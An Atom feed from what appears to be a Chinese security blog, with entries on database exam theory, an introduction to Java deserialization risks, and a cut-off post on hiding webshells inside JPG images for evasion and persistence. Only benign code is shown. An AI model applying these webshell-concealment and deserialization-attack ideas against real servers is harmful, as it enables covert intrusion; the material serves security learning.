<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Xinyuan&#39;s blog</title>
  <icon>https://www.gravatar.com/avatar/cb5dd586f32c8841e8838c89301eb7fa</icon>
  <subtitle>鑫缘的blog</subtitle>
  <link href="http://websec.space/atom.xml" rel="self"/>
  
  <link href="http://websec.space/"/>
  <updated>2022-06-08T14:41:34.051Z</updated>
  <id>http://websec.space/</id>
  
  <author>
    <name>鑫缘</name>
    <email>xy_404@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>数据库理论知识</title>
    <link href="http://websec.space/2022/06/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/"/>
    <id>http://websec.space/2022/06/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/</id>
    <published>2022-06-07T16:00:00.000Z</published>
    <updated>2022-06-08T14:41:34.051Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据库理论知识"><a href="#数据库理论知识" class="headerlink" title="数据库理论知识"></a>数据库理论知识</h1><blockquote><p>要数据库期末考试了，一个学期没听过课，看了看重点怎么跟平时我们搞sql注入时所关注的sql语句不同，全是理论知识，所以来水一篇博客吧。</p></blockquote><h2 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h2><h3 id="数据库的四个基本概念"><a href="#数据库的四个基本概念" class="headerlink" title="数据库的四个基本概念"></a>数据库的四个基本概念</h3><p>（1） 数据<br>（2） 数据库：长期储存在计算机内、有组织的、可共享的大量数据的集合<br>（3） 数据库管理系统：基础软件，是一个大型复杂的软件系统。<br>（4） 数据库系统：包括数据库、数据库管理系统、应用程序、数据库管理员</p><h3 id="数据管理的三个阶段"><a href="#数据管理的三个阶段" class="headerlink" title="数据管理的三个阶段"></a>数据管理的三个阶段</h3><p><img src="https://img-blog.csdnimg.cn/d94eb72616a248ea8b247c363a4ff31c.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h3 id="数据库系统的特点"><a href="#数据库系统的特点" class="headerlink" title="数据库系统的特点"></a>数据库系统的特点</h3><p>（1） 数据结构化<br>（2） 数据的共享性高，冗余度低，易扩充<br>（3） 数据的独立性高<br>（4） 数据由数据库管理系统统一管理和控制</p><p>数据模型三要素：数据结构、数据操作、数据的完整性约束条件</p><p>两类数据模型：概念模型，逻辑模型和物理模型</p><h3 id="常用的数据模型"><a href="#常用的数据模型" class="headerlink" title="常用的数据模型"></a>常用的数据模型</h3><p><img src="https://img-blog.csdnimg.cn/2bc2c8de0fca4c84b8f6de24df350641.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">（1） 层次模型：树形结构。网状模型：网状结构。这两类系统执行效率高。<br>（2) 关系模型：一个关系对应一张表，不允表中还有表。<br>优点：建立在严格的数学概念的基础上；概念单一；关系模型的存取路径对用户透明。<br>缺点：查询效率不如格式化数据模型；必须对用户的查询、优化，<br>增加了开发数据库管理系统的难度。</p><h3 id="三级模式-三级视图"><a href="#三级模式-三级视图" class="headerlink" title="三级模式(三级视图)"></a>三级模式(三级视图)</h3><p><img src="https://img-blog.csdnimg.cn/47276bd91bac4c35bcc82de5b27a57ad.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>External Schema —- (External) View </p><p>某一用户能够看到与处理的数据的结构描述</p><p>(Conceptual) Schema —- Conceptual View</p><p>从全局角度理解/管理的数据的结构描述含相应的关联约束体现在数据之间的内在本质联系</p><p>Internal Schema —- Internal View</p><p>存储在介质上的数据的结构描述，含存储路径、存储方式、索引方式</p><p>（1 ）一个模式可以有多个外模式，一个数据库只能有一个内模式。</p><p>（2）外模式/模式映像，映像定义通常包含在各外􂁑式􂲴描􄘠中，保证了数据的逻辑独立性。<br>（3） 模式/内模式映像，映像定义通常包含在模式描述中，保证了数据物理独立性。</p><h3 id="两层映像"><a href="#两层映像" class="headerlink" title="两层映像"></a>两层映像</h3><p>E-C Mapping : External Schema-Conceptual Schema Mapping</p><p>—-将外模式映射为概念模式，从而支持实现数据概念视图向外部视图的转换—便于用户观察和使用</p><p>C-1 Mapping ;Conceptual Schema-Internal Schema Mapping</p><p>—将概念模式映射为内模式，从而支持实现数据概念视图向内部视图的转换—-便于计算机进行存储和处理</p><h3 id="两个独立性"><a href="#两个独立性" class="headerlink" title="两个独立性"></a>两个独立性</h3><h4 id="逻辑数据独立性"><a href="#逻辑数据独立性" class="headerlink" title="逻辑数据独立性"></a>逻辑数据独立性</h4><p>当概念模式变化时，可以不改变外部模式(只需改变E-C Mapping)，从而无需改变应用程序</p><h4 id="物理数据独立性"><a href="#物理数据独立性" class="headerlink" title="物理数据独立性"></a>物理数据独立性</h4><p>当内部模式变化时，可以不改变概念模式(只需改变C-1 Mapping)，从而不改变外部模式</p><h2 id="第二章-关系数据库"><a href="#第二章-关系数据库" class="headerlink" title="第二章 关系数据库"></a>第二章 关系数据库</h2><h3 id="码："><a href="#码：" class="headerlink" title="码："></a>码：</h3><p>（1） 候选码：能唯一标识一个元组的一组属性<br>（2） 全码：关系模式的所有属性组时这个关系模式的候选码，称为全码。<br>（3） 主码：选定一个候选码作为主码<br>（4） 主属性：候选码中的属性<br>（5） 非主属性：不包含在任何候选码中的属性</p><h3 id="关系的完整性"><a href="#关系的完整性" class="headerlink" title="关系的完整性"></a>关系的完整性</h3><p>（1） 实体完整性：主属性不能取空<br>（2） 参照完整性：外码只能取空值或参照关系的主码值（将别的关系的主码作为本关系的属性，称为外码）（当外码作为本关系的主属性时，外码不能取空）<br>（3） 用户定义的完整性：例如某个属性必须取唯一值、某个非主属性不能取空值。</p><h3 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h3><h4 id="传统集合运算"><a href="#传统集合运算" class="headerlink" title="传统集合运算"></a>传统集合运算</h4><p><img src="https://img-blog.csdnimg.cn/11045a1dd94d49e393b1f1d95478cd9d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h4 id="专门的关系运算"><a href="#专门的关系运算" class="headerlink" title="专门的关系运算"></a>专门的关系运算</h4><p><img src="https://img-blog.csdnimg.cn/9cbfee5f96d94b31892ba4f6a591c5f2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h5><p><img src="https://img-blog.csdnimg.cn/22b0bfc63fa840838360539162b383ca.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://img-blog.csdnimg.cn/e0b13a0f86644b9aaf197759a1c407f4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p><img src="https://img-blog.csdnimg.cn/15de45222d514d4799598092ac2d4d17.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://img-blog.csdnimg.cn/a36cfe86eb79465f8b0ba70e995a6759.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://img-blog.csdnimg.cn/4437115136414ff2865fed99b15c24e0.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://img-blog.csdnimg.cn/34b210f3cedc4365abd16c3c31d7daae.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id="投影"><a href="#投影" class="headerlink" title="投影"></a>投影</h5><p><img src="https://img-blog.csdnimg.cn/f119c5ab7ed446369334597474fd92aa.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://img-blog.csdnimg.cn/0da4b01839694c58977d0145e4e0b504.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h5><p><img src="https://img-blog.csdnimg.cn/0404d53e24434f13870736ad63d699e4.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/ba717ec84b4b4bf8b7e3848b1408404f.png" alt="img" style="zoom: 80%;" />⼀般连接结果</p><img src="https://img-blog.csdnimg.cn/d56670fc399e4ee9a9d714ef9e992d4f.png" alt="img" style="zoom:67%;" /><p><img src="https://img-blog.csdnimg.cn/6cd2d81d31334b8c85103acb5c7948d4.png" alt="img" style="zoom:80%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>（不能删掉相同的属性列R. B和S . B 都保留,）</p><img src="https://img-blog.csdnimg.cn/682b767295c84e0da855e415e9785bfe.png" alt="img" style="zoom:80%;" /><p>⾃然连接把两个关系的同名属性中值相同的元组留下去掉重复属性和重复⾏。</p><p>做完⾃然连接后，被舍弃的元组称为悬浮元组如果把舍弃的元组也保留下来，就叫做外连接</p><h6 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h6><p><img src="https://img-blog.csdnimg.cn/0066ae7f259b4c61b3bc1f3ec9449065.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h6 id="左外连接-右外连接"><a href="#左外连接-右外连接" class="headerlink" title="左外连接                                                                                                                   右外连接"></a>左外连接                                                                                                                   右外连接</h6><p><img src="https://img-blog.csdnimg.cn/dae7358b883640e7ada94fb10e149550.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h5 id="除"><a href="#除" class="headerlink" title="除"></a>除</h5><p><img src="https://img-blog.csdnimg.cn/d92d575761684753a55f7ad03cddbc59.png" alt="img" style="zoom: 67%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://img-blog.csdnimg.cn/c990bc1964534e27afebc0d775bba1fe.png" alt="img" style="zoom:80%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>有相同的属性列B、C.a 的象集包含了关系中B C 的所有投影</p><p><img src="https://img-blog.csdnimg.cn/ee7bad9af18d47c2ba59680a0b956b77.png" alt="img" style="zoom:67%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><h2 id="第六章关系数据理论"><a href="#第六章关系数据理论" class="headerlink" title="第六章关系数据理论"></a>第六章关系数据理论</h2><h3 id="函数依赖的相关概念"><a href="#函数依赖的相关概念" class="headerlink" title="函数依赖的相关概念"></a>函数依赖的相关概念</h3><p><img src="https://img-blog.csdnimg.cn/0440c51269e8412a9e607ad5d6ac3c68.png" alt="img"></p><h3 id="范式"><a href="#范式" class="headerlink" title="范式"></a>范式</h3><p><img src="https://img-blog.csdnimg.cn/58c1e7dec68f46b4ace1727b8f6e8c31.png" alt="img"></p><p>F逻辑蕴涵X→ Y: 若x属性集中有2个元组的值相等, 则2 个元组在Y属性集上的值也相等。</p><img src="https://img-blog.csdnimg.cn/10b8c7d65a154c16aede40900509f57a.png" alt="img" style="zoom: 50%;" /><img src="https://img-blog.csdnimg.cn/3aff2a089e264dceb84609b51ac31749.png" alt="img" style="zoom: 50%;" /><h3 id="求属性集关于函数依赖集的闭包"><a href="#求属性集关于函数依赖集的闭包" class="headerlink" title="求属性集关于函数依赖集的闭包"></a>求属性集关于函数依赖集的闭包</h3><img src="https://img-blog.csdnimg.cn/893ad862f3394d8c935753f276bc188f.png" alt="img" style="zoom: 50%;" /><img src="https://img-blog.csdnimg.cn/b7e3d0d4a12b481cadc24fdf46823b34.png" alt="img" style="zoom: 50%;" /><h3 id="最小依赖集Fm"><a href="#最小依赖集Fm" class="headerlink" title="最小依赖集Fm"></a>最小依赖集Fm</h3><img src="https://img-blog.csdnimg.cn/4ffedf19d50844219ae7819a57874f7b.png" alt="img" style="zoom:67%;" /><p><img src="https://img-blog.csdnimg.cn/e62febe7874b44f6b58b5e3238d3c342.png" alt="img"></p><h2 id="第七章-数据库设计"><a href="#第七章-数据库设计" class="headerlink" title="第七章 数据库设计"></a>第七章 数据库设计</h2><img src="https://img-blog.csdnimg.cn/3663101854b14ad9861c121e85e49a09.png" alt="img" style="zoom: 15%;" /><h3 id="概念结构设计阶段"><a href="#概念结构设计阶段" class="headerlink" title="概念结构设计阶段"></a>概念结构设计阶段</h3><p>概念结构设计是整个数据库设计的关键，它通过对用户需求进行综合、归纳与抽象，形成一个独立于具体数据库管理系统的概念模型。</p><h3 id="逻辑结构设计"><a href="#逻辑结构设计" class="headerlink" title="逻辑结构设计"></a>逻辑结构设计</h3><p>逻辑结构设计是将概念结构转换为某个数据库管理系统所支持的数据模型，并对其进行优化。</p><h3 id="E-R图"><a href="#E-R图" class="headerlink" title="E-R图"></a>E-R图</h3><p>E-R图提供了表示实体型、属性和联系的方法。</p><p>（1）实体型用矩形表示。</p><p>（2）属性用椭圆形表示。</p><p>（3）联系用菱形表示，菱形框内写明联系名，并用无向边分别与有关实体型连接起来，同时在无向边旁标上联系的类型（1:1、1:n或m:n）。</p><h4 id="1对1"><a href="#1对1" class="headerlink" title="1对1"></a>1对1</h4><img src="https://img-blog.csdnimg.cn/img_convert/b50736dcbc183c5d77e609dbc5d01210.png" alt="img" style="zoom:50%;" /><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>通过定义，我们可以初步的到一组关系模式：</p><blockquote><p>教师（性别，职工号，手机号，年龄，姓名）<br>班级（班级名称，班级号）<br>负责（职工号，班级号）</p></blockquote><p>这就是一组关系模式，有人会说，<code>负责</code>这组关系模式好像多余呀。是的，下面我们就着手将其进行合并。</p><p>这里可以将<code>教师</code>和<code>负责</code>两个关系合并到一起，也可以选择将<code>班级</code>和<code>负责</code>合并到一起。</p><p>*<strong>1.合并<code>教师</code>和<code>负责</code>*</strong></p><blockquote><p>教师（性别，职工号，手机号，年龄，姓名，班级号）<br>班级（班级名称，班级号）</p></blockquote><p>合并就是将关系<code>负责</code>的属性添加到<code>教师</code>的属性中去，然后合并重复的属性。</p><h4 id="1对n"><a href="#1对n" class="headerlink" title="1对n"></a>1对n</h4><img src="https://img-blog.csdnimg.cn/img_convert/eaa2e9f6a2460aa5ae3fd7650a74635b.png" alt="img" style="zoom:50%;" /><p>同样的，我们有可以先得到一组独立地关系模式：</p><blockquote><p>学生（学号，姓名，性别）<br>班级（班级名称，班级号）<br>包含（学号，班级号，人数）</p></blockquote><p>然后将<code>联系</code>的关系进行合并。在<code>1对n</code>的关系中，需要将联系的关系添加到<code>n的一方</code>的关系模式中。</p><blockquote><p>学生（学号，姓名，性别，班级号）<br>班级（班级名称，班级号）</p></blockquote><h4 id="m对n转换关系"><a href="#m对n转换关系" class="headerlink" title="m对n转换关系"></a>m对n转换关系</h4><p>最后看一下多对多的关系是如何转换的。首先还是先给出ER图：</p><img src="https://image-static.segmentfault.com/192/068/1920684943-5c09eaed33df7_articlex" alt="clipboard.png" style="zoom:50%;" /><p>学生和课程的关系是<code>m:n</code>的。然后得到初步的关系模型：</p><blockquote><p>学生（学号，姓名，性别）<br>课程（课程号，课程名）<br>选修（学号，课程号，成绩）</p></blockquote><p>按照上面的惯例，下面我们应该合并关系模型了。但是在多对多的关系下，三种关系模式是不能进行合并的。而两个实体联系的关系模式正式我们常说的中间表的结构。</p><p>关系模式（Relation Schema）是对关系的描述,它可以形式化地表示为： <code>R（U，D，dom，F）</code>。</p><p>其中<code>R</code>为<code>关系名</code>，<code>U</code>为组成该关系的<code>属性名集合</code>，<code>D</code>为属性组U中属性所来自的<code>域</code>，<code>dom</code>为属性向域的<code>映象集合</code>，<code>F</code>为属性间数据的<code>依赖关系集合</code>。</p><p>通常简记为：<code>R(U)</code>或<code>R(A1，A2，…,An)</code>其中R为关系名，U为属性名集合，A1，A2，…,An为各属性名。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;数据库理论知识&quot;&gt;&lt;a href=&quot;#数据库理论知识&quot; class=&quot;headerlink&quot; title=&quot;数据库理论知识&quot;&gt;&lt;/a&gt;数据库理论知识&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;要数据库期末考试了，一个学期没听过课，看了看重点怎么跟平时我们搞sql注入</summary>
      
    
    
    
    <category term="数据库" scheme="http://websec.space/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="数据库" scheme="http://websec.space/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化之原生</title>
    <link href="http://websec.space/2022/05/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F/"/>
    <id>http://websec.space/2022/05/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F/</id>
    <published>2022-05-07T16:00:00.000Z</published>
    <updated>2022-05-08T14:59:23.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java反序列化之原生"><a href="#java反序列化之原生" class="headerlink" title="java反序列化之原生"></a>java反序列化之原生</h1><p>早就想学java安全，但一直无从下手，今天下定决心好好学习，当然以下内容可能会有些许错误，小白的烦恼。</p><h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><p> <strong>Java序列化</strong>是指把Java对象转换为字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。</p><p>序列化分为两大部分：序列化和反序列化。序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。</p><h4 id="为什么需要序列化与反序列化"><a href="#为什么需要序列化与反序列化" class="headerlink" title="为什么需要序列化与反序列化"></a>为什么需要序列化与反序列化</h4><p> 我们知道，当两个进程进行远程通信时，可以相互发送各种类型的数据，包括文本、图片、音频、视频等， 而这些数据都会以二进制序列的形式在网络上传送。那么当两个Java进程进行通信时，能否实现进程间的对象传送呢？答案是可以的。如何做到呢？这就需要Java序列化与反序列化了。换句话说，一方面，发送方需要把这个Java对象转换为字节序列，然后在网络上传送；另一方面，接收方需要从字节序列中恢复出Java对象。</p><p> 当我们明晰了为什么需要Java序列化和反序列化后，我们很自然地会想Java序列化的好处。其好处一是实现了数据的持久化，通过序列化可以把数据永久地保存到硬盘上（通常存放在文件里），二是，利用序列化实现远程通信，即在网络上传送对象的字节序列。</p><p>① 想把内存中的对象保存到一个文件中或者数据库中时候；<br>② 想用套接字在网络上传送对象的时候；<br>③ 想通过RMI传输对象的时候</p><h4 id="为什么会产生安全问题？"><a href="#为什么会产生安全问题？" class="headerlink" title="为什么会产生安全问题？"></a>为什么会产生安全问题？</h4><p>只要服务端反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p><h3 id="几种常见的序列化和反序列化协议"><a href="#几种常见的序列化和反序列化协议" class="headerlink" title="几种常见的序列化和反序列化协议"></a>几种常见的序列化和反序列化协议</h3><p>XML&amp;SOAP</p><p>JSON</p><p>Protobuf</p><h3 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h3><p>类比快递、打包和拆包</p><p>有些快递打包和拆包时有独特需求、比如易碎朝上，类比重写writeObject和readObject</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>Java反序列化的操作，很多是需要开发者深入参与的，所以你会发现大量的库会实现readObject 、<br>writeObject 方法，这和PHP中__wakeup 、__sleep 很少使用是存在鲜明对比的。<br>我在《Java安全漫谈 - 06.RMI篇(3)》的最后一部分，讲到了classAnnotations ，这次再来说说<br>objectAnnotation 。<br>Java在序列化时一个对象，将会调用这个对象中的writeObject 方法，参数类型是<br>ObjectOutputStream ，开发者可以将任何内容写入这个stream中；反序列化时，会调用<br>readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p><p>创建一个person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">        <span class="keyword">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span>+</span><br><span class="line">        <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&quot;\&#x27;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;,&#x27;age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个序列化类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line">public class SerializationTest &#123;</span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Person person=new Person(&quot;xinyuan&quot;,22);</span><br><span class="line">        serialize(person);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建一个反序列化类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line">public class UnserializationTest &#123;</span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Person person=(Person) unserialize(&quot;ser.bin&quot;);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="可能的形式"><a href="#可能的形式" class="headerlink" title="可能的形式"></a>可能的形式</h3><p>1.入口类的readObject直接调用危险方法</p><p><img src="https://img-blog.csdnimg.cn/1717fe84d4b248ccab5d7f4ba30fa6c4.png" alt="img" style="zoom: 50%;" /><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>在person类，重写readObject方法，序列化后，反序列化</p><img src="https://img-blog.csdnimg.cn/a306a778f42a443ba2961e1ccb2a06c4.png" alt="img" style="zoom:50%;" /><p>2.入口类参数中包含可控类，该类有危险方法，readObject时调用。</p><p>3.入口类参数包含可控类，该类又调用其他有危险方法的类，readObject时调用</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>共同条件 继承Serializable</p><p>入口类 source（重写readObject 参数类型宽泛 最好jdk自带） Map&lt;Object ,Object&gt;</p><p>调用链 gadget chain 相同名称，相同类型</p><p>执行类 sink（rce ssrf 写文件等等）</p><p><a href="https://github.com/frohoff/ysoserial/">https://github.com/frohoff/ysoserial/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java反序列化之原生&quot;&gt;&lt;a href=&quot;#java反序列化之原生&quot; class=&quot;headerlink&quot; title=&quot;java反序列化之原生&quot;&gt;&lt;/a&gt;java反序列化之原生&lt;/h1&gt;&lt;p&gt;早就想学java安全，但一直无从下手，今天下定决心好好学习，当然以下</summary>
      
    
    
    
    <category term="wp" scheme="http://websec.space/categories/wp/"/>
    
    
    <category term="wp" scheme="http://websec.space/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>图片马</title>
    <link href="http://websec.space/2022/05/07/%E5%9B%BE%E7%89%87%E9%A9%AC/"/>
    <id>http://websec.space/2022/05/07/%E5%9B%BE%E7%89%87%E9%A9%AC/</id>
    <published>2022-05-06T16:00:00.000Z</published>
    <updated>2022-05-07T09:41:20.504Z</updated>
    
    <content type="html"><![CDATA[<h1 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h1><blockquote><p>本文主要是基于jpg格式的图片型webshell的研究，即再正常图片中隐藏webshell代码，从而达到webshell免杀、实现隐藏后门与权限维持的目的。</p></blockquote><h2 id="从php的base64-decode说起"><a href="#从php的base64-decode说起" class="headerlink" title="从php的base64_decode说起"></a>从php的base64_decode说起</h2><p>我们知道，再php的base64_decode中，会只对合法字符合并后解码，非法字符会直接丢弃，不参与整体的base64解码。</p><p>合法字符包括以下64个字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A-Za-z0-9/+</span><br></pre></td></tr></table></figure><p>其中字母是26+26，数字是10，符号是3，合计为26+26+10+2=64，等于号是占位符，不是编码范围之内的字符</p><p>可以用以下代码做测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo base64_decode($_GET[1]);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 